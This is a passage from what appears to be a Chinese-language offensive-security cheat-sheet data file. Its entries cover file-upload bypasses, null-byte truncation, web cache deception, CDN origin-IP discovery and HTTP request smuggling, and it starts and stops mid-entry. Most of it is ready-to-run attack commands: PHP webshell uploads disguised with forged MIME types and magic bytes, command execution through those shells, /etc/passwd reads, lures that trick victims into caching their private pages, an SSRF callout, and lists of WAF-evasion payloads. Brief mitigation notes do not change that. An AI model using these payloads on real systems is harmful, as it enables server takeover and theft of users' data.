          description: '使用tar/7z/cpio等替代压缩格式，WAF可能仅检测zip格式的路径遍历' 
        },
        { 
          title: '符号链接攻击', 
          command: `# 创建包含符号链接的压缩包
import zipfile, os

# 方法1: tar符号链接
import tarfile
with tarfile.open('symlink.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='link')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tar.addfile(info)

# 方法2: zip中嵌入符号链接（Linux）
os.symlink('/etc/passwd', '/tmp/link')
with zipfile.ZipFile('symlink.zip', 'w') as zf:
    zf.write('/tmp/link', 'link')`,
            syntaxBreakdown: [
              { part: '# 创建包含符号链接的压缩包', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
          description: '压缩包内嵌入符号链接指向敏感文件，解压后通过符号链接读取目标文件' 
        },
        { 
          title: '文件名编码混淆', 
          command: `# Unicode文件名混淆
import zipfile, io, struct

with zipfile.ZipFile('encoded.zip', 'w') as zf:
    # 使用反斜杠（Windows路径分隔符）
    zf.writestr('..\\\\..\\\\..\\\\tmp\\\\test.txt', 'security_check')

# 手工构造zip（修改中央目录文件名）
# 使用UTF-8编码的路径遍历字符
with open('crafted.zip', 'rb') as f:
    data = bytearray(f.read())
    # 替换文件名中的编码字符
    # ../变为 %2e%2e%2f 的原始字节`,
            syntaxBreakdown: [
              { part: '# Unicode文件名混淆', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
          description: '通过修改压缩包内文件名的编码方式（UTF-8/GBK/反斜杠）绕过解压时的路径检查' 
        }
      ]
    },
  {
    id: 'file-mime',
    name: 'MIME类型绕过',
    description: '通过伪造MIME类型(Content-Type)绕过文件上传的类型检查，上传恶意可执行文件',
    category: '文件漏洞',
    subCategory: 'MIME',
    tags: ['mime', 'bypass'],
    prerequisites: ['目标存在文件上传功能', '服务端仅通过Content-Type判断文件类型', '了解目标允许的MIME类型'],
    execution: [
      {
        title: '探测文件类型检查机制',
        command: `# 测试不同的上传方式判断检查点:

# 1. 正常上传(应该成功):
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"

# 2. 修改Content-Type(判断是否仅检查MIME):
curl -F "file=@shell.php;type=image/jpeg" "http://target.com/upload"

# 3. 修改扩展名(判断是否检查扩展名):
curl -F "file=@shell.jpg;type=application/x-php" "http://target.com/upload"

# 4. 仅修改文件头(判断是否检查Magic Bytes):
# GIF89a开头的PHP:
printf "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.gif
curl -F "file=@shell.gif;type=image/gif" "http://target.com/upload"`,
        description: '通过对比测试判断服务端使用的文件类型验证方式',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'type=image/jpeg', explanation: '在multipart请求中伪造Content-Type', type: 'value' },
          { part: 'GIF89a', explanation: 'GIF图片的Magic Bytes文件头', type: 'value' },
        ]
      },
      {
        title: 'MIME类型伪造上传Webshell',
        command: `# 将PHP webshell的Content-Type伪造为图片:
curl -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# 如果服务端同时检查扩展名，使用双扩展名:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=shell.jpg.php" "http://target.com/upload"

# Apache多扩展名解析:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.abc" "http://target.com/upload"

# Nginx解析漏洞:
curl -F "file=@shell.jpg;type=image/jpeg" "http://target.com/upload"
curl "http://target.com/uploads/shell.jpg/.php"`,
        description: '使用MIME伪造结合各种文件名技巧上传可执行文件',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'filename=shell.php.jpg', explanation: '双扩展名绕过，某些服务端只检查最后的扩展名', type: 'value' },
          { part: 'shell.php.abc', explanation: 'Apache对未知扩展名会向左解析到.php', type: 'value' },
          { part: 'shell.jpg/.php', explanation: 'Nginx/PHP-CGI解析漏洞路径', type: 'value' },
        ]
      },
      {
        title: 'Magic Bytes伪造',
        command: `# 在PHP文件前添加各种文件头:

# JPEG文件头:
printf "\xff\xd8\xff\xe0\x00\x10JFIF" > shell.php
echo "<?php system(\$_GET['cmd']); ?>" >> shell.php

# PNG文件头:
printf "\x89PNG\r\n\x1a\n" > shell.php
echo "<?php system(\$_GET['cmd']); ?>" >> shell.php

# GIF文件头:
printf "GIF89a" > shell.php
echo "<?php system(\$_GET['cmd']); ?>" >> shell.php

# BMP文件头:
printf "BM" > shell.php
echo "<?php system(\$_GET['cmd']); ?>" >> shell.php

# 上传:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "http://target.com/upload"`,
        description: '在恶意文件前面添加合法的Magic Bytes文件头绕过内容检查',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '\xff\xd8\xff\xe0', explanation: 'JPEG文件的Magic Bytes签名', type: 'value' },
          { part: '\x89PNG', explanation: 'PNG文件的Magic Bytes签名', type: 'value' },
          { part: 'GIF89a', explanation: 'GIF89a动画格式的文件头', type: 'value' },
        ]
      },
      {
        title: '验证上传结果',
        command: `# 确认文件上传路径:
curl -v "http://target.com/uploads/shell.php"

# 执行命令:
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# 如果无法直接访问，尝试其他路径:
curl "http://target.com/upload/files/shell.php?cmd=id"
curl "http://target.com/static/uploads/shell.php?cmd=id"
curl "http://target.com/resources/shell.php?cmd=id"`,
        description: '确认上传文件路径并验证Webshell可执行',
        platform: 'all',
        syntaxBreakdown: [
          { part: '?cmd=id', explanation: '通过GET参数传递系统命令', type: 'value' },
          { part: 'cat+/etc/passwd', explanation: 'URL中空格编码为+号', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: 'MIME类型伪造是最常见的文件上传绕过技术之一。当服务端仅依赖HTTP请求中的Content-Type字段判断文件类型时，攻击者可以将恶意文件(如PHP webshell)的Content-Type伪造为允许的类型(如image/jpeg)，使其通过类型检查被保存到服务器上。',
      vulnerability: '服务端仅通过HTTP请求的Content-Type头或文件的Magic Bytes判断文件类型，未对文件内容进行深度检查(如实际解析图片)，也未限制上传目录的脚本执行权限。',
      exploitation: '利用流程：1) 上传正常文件观察行为 2) 修改Content-Type测试是否绕过 3) 结合Magic Bytes文件头伪造 4) 利用Web服务器解析漏洞(双扩展名/Nginx解析) 5) 定位上传路径访问Webshell',
      mitigation: '1) 不信任Content-Type，使用文件内容检测(如imagemagick验证图片) 2) 白名单限制文件扩展名 3) 重命名上传文件(使用UUID) 4) 上传目录禁止执行脚本 5) 文件存储与Web服务分离',
      difficulty: 'beginner'
    },
      wafBypass: [
        { 
          title: 'Polyglot文件绕过', 
          command: `# GIF+PHP Polyglot
GIF89a<?php echo "security_check"; ?>

# PNG+PHP Polyglot（使用exiftool注入）
exiftool -Comment='<?php echo "security_check"; ?>' test.png
mv test.png test.php.png

# JPEG Polyglot
exiftool -DocumentName='<?php echo "security_check"; ?>' test.jpg

# BMP+PHP
python3 -c "import struct; open('poly.php.bmp','wb').write(b'BM'+struct.pack('<I',54)+b'\\x00'*46+b'<?php echo \\"security_check\\"; ?>')"`,
            syntaxBreakdown: [
              { part: '# GIF+PHP Polyglot', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '创建同时满足图片格式魔术字节和PHP解析的Polyglot文件，绕过文件类型检测' 
        },
        { 
          title: 'Content-Type边界操控', 
          command: `# 多个Content-Type头
POST /upload HTTP/1.1
Content-Type: image/jpeg
Content-Type: application/x-php

# boundary混淆
Content-Type: multipart/form-data; boundary=abc; boundary=xyz

# 大小写混淆MIME类型
Content-Type: Image/JPEG
Content-Type: image/JPEG; charset=utf-8

# 添加额外参数
Content-Type: image/jpeg; name="test.php"`,
            syntaxBreakdown: [
              { part: '# 多个Content-Type头', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
          description: '利用多重Content-Type头、boundary混淆和MIME大小写差异绕过WAF文件类型检查' 
        },
        { 
          title: 'EXIF元数据注入payload', 
          command: `# EXIF Comment注入
exiftool -Comment='<?php system("id"); ?>' photo.jpg

# XMP元数据注入
exiftool -XMP-dc:Description='<script>alert(1)</script>' photo.jpg

# ICC Profile注入
exiftool -ICC_Profile:ProfileDescription='<?php echo "security_check"; ?>' photo.jpg

# 上传后配合文件包含利用
# http://target/include.php?file=uploads/photo.jpg`,
          description: '将payload注入图片的EXIF/XMP/ICC元数据字段，配合文件包含漏洞执行代码',
          syntaxBreakdown: [
            { part: '<script>', explanation: '脚本标签', type: 'tag' },
            { part: 'alert()', explanation: '弹窗函数', type: 'function' }
          ]
        }
      ]
    },
  {
    id: 'file-null-byte',
    name: '空字节截断',
    description: '利用空字节(%00/\x00)截断文件名的扩展名验证，绕过文件上传白名单限制',
    category: '文件漏洞',
    subCategory: 'Null Byte',
    tags: ['null-byte', 'bypass'],
    prerequisites: ['目标使用白名单验证文件扩展名', '后端语言或库受空字节截断影响(PHP<5.3.4, Java旧版本)', '服务端在路径拼接中存在截断点'],
    execution: [
      {
        title: '空字节截断原理与环境检测',
        command: `# 空字节截断受影响的环境:
# - PHP < 5.3.4 (底层C函数将\x00视为字符串结尾)
# - Java旧版本的File类
# - 部分Python 2.x版本
# - 使用C/C++扩展的程序

# 检测PHP版本:
curl -sI "http://target.com/" | grep -i "x-powered-by\|server"
curl -s "http://target.com/phpinfo.php" | grep -i "php version"`,
        description: '检测目标环境是否可能受空字节截断影响',
        platform: 'all',
        syntaxBreakdown: [
          { part: '%00', explanation: 'URL编码的空字节(Null Byte)', type: 'value' },
          { part: 'PHP < 5.3.4', explanation: '该版本前PHP底层使用C字符串，\x00截断', type: 'value' },
        ]
      },
      {
        title: '文件上传空字节截断',
        command: `# 方法1: URL编码空字节:
curl -F "file=@shell.php;filename=shell.php%00.jpg" "http://target.com/upload"

# 方法2: 在Burp中修改原始字节:
# 将文件名 shell.php[0x00].jpg 中的[0x00]替换为实际的空字节
# Burp Repeater → 选中%00 → 右键 → Convert → URL decode

# 方法3: Python发送:
import requests
files = {"file": ("shell.php\x00.jpg", open("shell.php","rb"), "image/jpeg")}
r = requests.post("http://target.com/upload", files=files)
print(r.status_code, r.text[:200])`,
        description: '在文件名中注入空字节截断扩展名验证',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'shell.php%00.jpg', explanation: '空字节后的.jpg通过白名单检查，但保存时被截断为shell.php', type: 'value' },
          { part: '\x00', explanation: 'Python中的空字节转义序列', type: 'value' },
        ]
      },
      {
        title: '文件包含空字节截断',
        command: `# PHP文件包含中的空字节截断:
# 服务端代码: include($_GET["page"] . ".php");

# 正常请求:
curl "http://target.com/index.php?page=about"   # → include("about.php")

# 空字节截断:
curl "http://target.com/index.php?page=../../../etc/passwd%00"
# → include("../../../etc/passwd\x00.php")
# → 实际读取 ../../../etc/passwd (\x00截断了.php)

# 配合路径遍历:
curl "http://target.com/index.php?page=../../../var/log/apache2/access.log%00"
curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00"`,
        description: '在文件包含场景中利用空字节截断服务端拼接的后缀',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'page=../../../etc/passwd%00', explanation: '空字节截断后面的.php后缀', type: 'value' },
          { part: 'include($_GET["page"].".php")', explanation: '服务端强制拼接.php后缀的代码', type: 'value' },
        ]
      },
      {
        title: '现代替代方案(PHP>=5.3.4)',
        command: `# PHP 5.3.4+已修复空字节截断，替代方案:

# 1. 路径截断(超长路径):
# Windows MAX_PATH=260, Linux PATH_MAX=4096
payload="shell.php" + "/./" * 2048 + ".jpg"
curl "http://target.com/upload" -F "file=@shell.php;filename=$payload"

# 2. 点号截断(Windows):
# Windows忽略文件名末尾的点号和空格
curl -F "file=@shell.php;filename=shell.php." "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php " "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php::$DATA" "http://target.com/upload"

# 3. 大小写绕过:
curl -F "file=@shell.pHP;type=image/jpeg" "http://target.com/upload"`,
        description: '在PHP 5.3.4+无法使用空字节截断时的替代绕过方案',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'shell.php.', explanation: 'Windows忽略末尾点号，保存为shell.php', type: 'value' },
          { part: '::$DATA', explanation: 'NTFS备用数据流，Windows特性绕过', type: 'value' },
          { part: '/./', explanation: '路径截断：超长路径导致后缀被截断', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: '空字节截断(Null Byte Injection)利用C语言以\x00作为字符串结束符的特性。当后端语言(如PHP<5.3.4)底层使用C函数处理文件路径时，攻击者在文件名中注入%00可以截断后面的字符，从而绕过文件扩展名验证。虽然现代语言已修复此问题，但在旧系统中仍然有效。',
      vulnerability: '后端语言在文件路径处理过程中，先用高级语言进行字符串操作(如拼接.php后缀、检查扩展名白名单)，然后将结果传递给C底层函数打开文件。C函数遇到\x00就停止读取，导致高级语言的安全检查被绕过。',
      exploitation: '利用流程：1) 检测目标PHP/Java版本 2) 在文件名中注入%00 3) 白名单检查只看%00后面的.jpg 4) 实际保存/包含时%00截断为.php 5) 访问验证',
      mitigation: '1) 升级到PHP 5.3.4+/最新版本 2) 在路径操作前过滤\x00字符 3) 使用白名单+重命名(UUID) 4) 不使用用户输入直接拼接路径 5) 上传目录禁止脚本执行',
      difficulty: 'intermediate'
    },
      wafBypass: [
        { 
          title: '路径长度截断', 
          command: `# PHP路径长度截断（PHP < 5.3, 超过4096字符）
../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

# 超长扩展名截断
test.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# 点号截断（Windows MAX_PATH=260）
test.php...........................................................................`,
            syntaxBreakdown: [
              { part: '# PHP路径长度截断（PHP < 5.3, 超过4096字符）', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共6行', type: 'value' }
            ],
          description: '利用文件系统路径最大长度限制，超长路径导致后缀被截断' 
        },
        { 
          title: 'Windows特殊文件名技巧', 
          command: `# 点空格点截断（Windows NTFS）
test.php. . . .
test.php::$DATA
test.php::$DATA.jpg

# ADS流隐藏扩展名
test.php::$INDEX_ALLOCATION
test.asp;.jpg
test.asp%00.jpg

# Windows短文件名（8.3格式）
TESTPH~1.PHP
SHELL~1.PHP`,
            syntaxBreakdown: [
              { part: '# 点空格点截断（Windows NTFS）', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
          description: '利用Windows NTFS文件系统特性（ADS流/短文件名/特殊字符处理）绕过扩展名检测' 
        },
        { 
          title: '替代空字节表示', 
          command: `# 不同编码的空字节
test.php%00.jpg
test.php\\x00.jpg
test.php\\0.jpg
test.php\\u0000.jpg

# URL编码变体
test.php%2500.jpg   # 双重编码空字节
test.php%u0000.jpg  # UTF-16空字节

# 特殊终止符
test.php%0d.jpg     # 回车符
test.php%0a.jpg     # 换行符
test.php%1a.jpg     # EOF标记`,
            syntaxBreakdown: [
              { part: '# 不同编码的空字节', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共12行', type: 'value' }
            ],
          description: '使用不同编码方式表示空字节或终止符，绕过WAF对%00的检测规则' 
        }
      ]
    },
  {
    id: 'cache-deception',
    name: '缓存欺骗',
    description: '利用Web缓存和服务器路径解析的差异，诱导CDN/缓存层缓存包含敏感信息的动态页面',
    category: '缓存与CDN安全',
    subCategory: 'Deception',
    tags: ['cache', 'deception', 'auth'],
    prerequisites: ['目标使用CDN或反向代理缓存', '路径解析存在差异(后端忽略路径后缀)', '缓存策略基于URL扩展名'],
    execution: [
      {
        title: '探测缓存行为',
        command: `# 检测是否存在缓存层:
curl -sI "http://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"

# 测试缓存策略(静态文件是否被缓存):
curl -sI "http://target.com/test.css" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.js" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.jpg" | grep -iE "x-cache|age"

# 对比动态页面:
curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"`,
        description: '检测目标的缓存层和缓存策略配置',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'X-Cache', explanation: '缓存命中状态头(HIT/MISS)', type: 'value' },
          { part: 'Age:', explanation: '响应在缓存中存储的时间(秒)', type: 'value' },
          { part: 'Via:', explanation: '显示中间代理/缓存服务器', type: 'value' },
        ]
      },
      {
        title: '路径混淆缓存欺骗',
        command: `# 核心技巧: 在动态页面URL后添加静态文件扩展名
# 后端将 /account/profile.css 解析为 /account (忽略不存在的路径)
# 缓存层看到 .css 扩展名，认为是静态资源并缓存

# 步骤1: 构造欺骗URL(以受害者身份访问)
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile.css"

# 步骤2: 攻击者无需认证直接访问缓存内容
curl "http://target.com/account/profile.css"

# 多种路径变体:
curl "http://target.com/account/x.js"
curl "http://target.com/account/x.jpg"
curl "http://target.com/account/x.png"
curl "http://target.com/api/user/info/x.css"
curl "http://target.com/settings/x.svg"`,
        description: '在动态页面URL后附加静态文件扩展名触发缓存',
        platform: 'all',
        syntaxBreakdown: [
          { part: '/account/profile.css', explanation: '后端解析为/account但缓存层认为是CSS文件', type: 'value' },
          { part: '.css/.js/.jpg', explanation: '常见的缓存触发扩展名', type: 'value' },
        ]
      },
      {
        title: '高级缓存欺骗变体',
        command: `# 分隔符混淆(不同组件对路径分隔符理解不同):
curl "http://target.com/account;x.css"
curl "http://target.com/account%23x.css"
curl "http://target.com/account%3fx.css"

# 参数污染:
curl "http://target.com/account?cb=123.css"
curl "http://target.com/account/..%2fstatic/x.css"

# RPO (Relative Path Overwrite):
curl "http://target.com/account/..%2f..%2fstatic/style.css"

# Normalization差异:
curl "http://target.com/account/./x.css"
curl "http://target.com/account%2fx.css"`,
        description: '利用路径分隔符、参数和规范化差异的高级缓存欺骗',
        platform: 'all',
        syntaxBreakdown: [
          { part: ';x.css', explanation: '分号在某些框架中是路径参数分隔符', type: 'value' },
          { part: '%23', explanation: '#的URL编码，不同组件处理不同', type: 'value' },
          { part: '..%2f', explanation: '../的URL编码，可能绕过缓存层的路径匹配', type: 'value' },
        ]
      },
      {
        title: '完整攻击流程验证',
        command: `# 完整攻击演示:

# 1. 先确认动态页面包含敏感信息:
curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email\|phone\|address\|token"

# 2. 诱导受害者访问欺骗URL(通过钓鱼邮件/消息):
# 受害者点击: http://target.com/account/avatar.jpg
# 这会将其/account页面(含个人信息)缓存为"图片"

# 3. 攻击者访问同一URL获取缓存的敏感信息:
curl "http://target.com/account/avatar.jpg"
# 返回受害者的账户页面(包含邮箱、手机号、地址等)

# 4. 验证缓存命中:
curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
# 期望看到: X-Cache: HIT`,
        description: '演示从诱导缓存到窃取数据的完整攻击链',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'X-Cache: HIT', explanation: '确认响应来自缓存而非源站', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: 'Web缓存欺骗(Web Cache Deception)利用CDN/缓存层与后端服务器对URL路径的解析差异。当后端将/account/x.css按/account处理(返回用户信息)，而缓存层因.css扩展名将响应当作静态资源缓存时，攻击者可以诱导受害者访问该URL，然后直接获取缓存的敏感信息。',
      vulnerability: '缓存层(CDN/Varnish/Nginx)和后端应用对同一URL路径的解析存在差异：1) 后端忽略URL中不存在的路径段 2) 缓存层根据扩展名决定缓存策略 3) 缓存策略未排除包含敏感数据的响应',
      exploitation: '利用流程：1) 探测缓存层和缓存策略 2) 找到包含敏感信息的动态页面 3) 构造带静态扩展名的欺骗URL 4) 诱导受害者访问该URL触发缓存 5) 攻击者无需认证访问缓存获取敏感数据',
      mitigation: '1) 敏感页面设置Cache-Control: no-store, private 2) 缓存层验证Content-Type与扩展名一致 3) 后端对不存在的路径返回404 4) 缓存key包含Cookie/Authorization 5) CDN配置只缓存明确的静态资源路径',
      difficulty: 'intermediate'
    },
      wafBypass: [
        { 
          title: '路径分隔符混淆', 
          command: `# 利用缓存服务器对路径分隔符的差异解析
https://target.com/account/settings;.css
https://target.com/account/settings%0a.css
https://target.com/account/settings%23.css
https://target.com/account/settings%3f.css

# URL编码分隔符
https://target.com/account/settings%2f.css
https://target.com/account/settings%5c.css`,
            syntaxBreakdown: [
              { part: '# 利用缓存服务器对路径分隔符的差异解析', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共8行', type: 'value' }
            ],
          description: '利用缓存服务器与源站对分号、换行、井号等分隔符解析不一致触发缓存' 
        },
        { 
          title: 'RPO相对路径覆盖', 
          command: `# Relative Path Overwrite
https://target.com/account/settings/..%2f..%2fstatic/style.css
https://target.com/account/settings/nonexistent.css

# 路径参数注入
https://target.com/account/settings;param=value/test.css
https://target.com/account/settings/test.js?_=1

# 不同缓存键操控
https://target.com/account/settings HTTP/1.1
X-Original-URL: /static/style.css`,
            syntaxBreakdown: [
              { part: '# Relative Path Overwrite', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用相对路径覆盖（RPO）使浏览器请求敏感页面但缓存服务器按静态资源缓存' 
        },
        { 
          title: '缓存与源站规范化差异', 
          command: `# Cloudflare/Varnish路径规范化差异
https://target.com/account/settings/.css
https://target.com/account/settings/test.avif
https://target.com/account/settings/x.woff2

# 双斜杠混淆
https://target.com//account//settings.css
https://target.com/account/settings%252f.css

# 利用Vary头缺失
curl -H "Accept: text/css" https://target.com/account/settings`,
            syntaxBreakdown: [
              { part: '# Cloudflare/Varnish路径规范化差异', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用CDN/反向代理与源站对URL规范化处理的差异，使缓存误缓存敏感内容' 
        }
      ]
    },
  {
    id: 'cdn-bypass',
    name: 'CDN绕过',
    description: '绕过CDN查找真实IP',
    category: '缓存与CDN安全',
    subCategory: 'CDN',
    tags: ['cdn', 'bypass', 'recon'],
    prerequisites: ['目标使用CDN'],
    execution: [
      {
        title: '历史DNS',
        command: `# DNS历史记录查询获取真实IP:
# 1. SecurityTrails(需要API Key):
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'

# 2. ViewDNS:
curl -s "https://viewdns.info/iphistory/?domain=target.com"

# 3. DNS DB在线查询:
# https://dnsdb.io/
# https://securitytrails.com/
# https://completedns.com/

# 4. Censys搜索:
curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com" \
  -u "API_ID:API_SECRET"

# 5. 使用FOFA:
# domain="target.com" && type="A"

# 6. 多地Ping对比:
nslookup target.com 8.8.8.8
nslookup target.com 1.1.1.1`,
        description: '查找未使用CDN时的IP',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'DNS', explanation: '域名解析记录', type: 'concept' },
        ]
      },
      {
        title: '邮件头',
        command: `# 通过邮件头泄露真实IP:
# 1. 触发目标站点发送邮件(注册/找回密码/订阅):
curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
curl -d "email=attacker@gmail.com" "http://target.com/subscribe"

# 2. 查看收到邮件的原始头(Gmail: 显示原始邮件):
# 查找以下字段中的IP:
# Received: from mail.target.com (203.0.113.50)
# X-Originating-IP: [203.0.113.50]
# Return-Path: <noreply@target.com>

# 3. 使用swaks发送邮件触发:
swaks --to attacker@gmail.com --from test@target.com --server target.com

# 4. 分析邮件头:
# 最底部的Received字段通常包含源服务器真实IP

# 5. 如果目标有RSS订阅:
# 订阅后查看请求来源IP
curl "http://target.com/rss" -v`,
        description: '查看邮件源码中的Received头',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Received', explanation: '邮件传输路径', type: 'header' },
        ]
      },
      {
        title: 'DNS历史与证书透明度查询',
        command: `# 1. DNS历史记录查询:
# SecurityTrails:
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY" | python3 -m json.tool

# 在线查询:
# https://viewdns.info/iphistory/?domain=target.com
# https://completedns.com/dns-history/
# https://dnshistory.org/dns-records/target.com

# 2. 证书透明度日志(CT Log):
curl -s "https://crt.sh/?q=target.com&output=json" | \
  python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"

# 3. Censys搜索:
# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com

# 4. FOFA/Shodan搜索:
# FOFA: cert="target.com"
# Shodan: ssl.cert.subject.cn:target.com`,
        description: '通过DNS历史、证书透明度、搜索引擎查找CDN背后的真实IP',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'crt.sh', explanation: '证书透明度日志搜索引擎', type: 'value' },
          { part: 'SecurityTrails', explanation: 'DNS历史记录查询API', type: 'value' },
          { part: 'cert="target.com"', explanation: 'FOFA语法搜索使用特定证书的IP', type: 'parameter' },
        ]
      },
      {
        title: '子域名与相关服务探测真实IP',
        command: `# 1. 子域名可能未经CDN:
for sub in mail ftp ssh vpn dev staging test api admin mx; do
  ip=$(dig +short \${sub}.target.com A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "\${sub}.target.com → $ip"
done

# 2. MX记录(邮件服务器通常不走CDN):
dig +short target.com MX
dig +short $(dig +short target.com MX | awk '{print $2}') A

# 3. SPF记录中的IP:
dig +short target.com TXT | grep -i "spf"
# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50可能是真实IP

# 4. 触发目标服务器主动连接:
# 在目标网站留下一个URL(如头像、webhook)指向自己的服务器
# 查看连接IP(这是目标的出站IP，通常是真实IP):
# nc -lvp 8888

# 5. SSRF利用:
# 如果存在SSRF漏洞，让服务器连接外部获取IP
curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"`,
        description: '通过子域名、邮件记录、主动连接等方式发现真实IP',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'dig +short target.com MX', explanation: '查询邮件服务器记录，通常直接暴露真实IP', type: 'command' },
          { part: 'SPF记录', explanation: '邮件发送策略中包含的IP白名单', type: 'value' },
        ]
      },
      {
        title: '验证真实IP并直接访问',
        command: `# 1. 验证候选IP是否是真实服务器:
REAL_IP="203.0.113.50"

# 直接IP访问(Host头指定域名):
curl -sI "http://\${REAL_IP}/" -H "Host: target.com"

# HTTPS访问(忽略证书):
curl -sk "https://\${REAL_IP}/" -H "Host: target.com"

# 2. 对比响应确认:
cdn_resp=$(curl -s "https://target.com/" | md5sum)
direct_resp=$(curl -sk "https://\${REAL_IP}/" -H "Host: target.com" | md5sum)
echo "CDN: $cdn_resp"
echo "Direct: $direct_resp"
[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"

# 3. 修改hosts绕过CDN测试:
echo "\${REAL_IP} target.com" | sudo tee -a /etc/hosts

# 4. 直接对真实IP进行渗透(绕过CDN的WAF):
nmap -sV -p 1-65535 \${REAL_IP}
# CDN的WAF通常只保护CDN入口，直接访问真实IP可绕过`,
        description: '验证候选IP并直接访问绕过CDN防护',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-H "Host: target.com"', explanation: '通过IP访问但指定Host头使服务器返回正确内容', type: 'parameter' },
          { part: '-sk', explanation: '-s静默模式 -k忽略证书错误', type: 'parameter' },
        ]
      },
    ],
    wafBypass: [
      {
        title: '绕过CDN WAF的多种技术',
        command: `# 找到真实IP后，CDN的WAF就被完全绕过了
# 但如果目标自身也有WAF，还需要:

# 1. 使用真实IP直接访问(绕过CDN WAF):
curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"

# 2. 如果CDN仅对常见端口做WAF:
# 扫描非标端口的Web服务:
nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP

# 3. IPv6绕过(CDN可能只保护IPv4):
dig +short target.com AAAA
curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"

# 4. 源站IP白名单探测:
# 某些源站配置了仅允许CDN IP访问
# 尝试伪造CDN的IP:
curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"`,
        description: '利用真实IP和非标端口绕过CDN的WAF防护',
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'https://REAL_IP/vulnerable?id=1', explanation: '目标URL', type: 'value' },
          { part: '# 找到真实IP后，CDN的WAF就被完全绕过了', explanation: '绕过技术', type: 'technique' }
        ]
      },
    ],
    tutorial: {
      overview: 'CDN隐藏了真实IP，绕过CDN是渗透测试的重要步骤。',
      vulnerability: '信息泄露。',
      exploitation: 'DNS历史、子域名、邮件头、全网扫描',
      mitigation: '仅允许CDN IP访问源站',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'smuggling-cl-cl',
    name: 'CL-CL走私',
    description: '利用前端代理和后端服务器同时处理Content-Length头但对多个CL头的处理差异实现HTTP请求走私',
    category: '请求走私',
    subCategory: 'CL-CL',
    tags: ['smuggling', 'cl-cl', 'http'],
    prerequisites: ['存在前端代理(如HAProxy/Nginx)+后端服务器架构', '两端对Content-Length头的解析存在差异', '理解HTTP请求走私原理'],
    execution: [
      {
        title: '检测CL-CL走私条件',
        command: `# 检测前端代理类型:
curl -sI "http://target.com/" | grep -iE "server:|via:|x-forwarded"

# 发送包含两个Content-Length的请求:
curl -v "http://target.com/" \
  -H "Content-Length: 6" \
  -H "Content-Length: 0" \
  -d "test12"

# 观察响应:
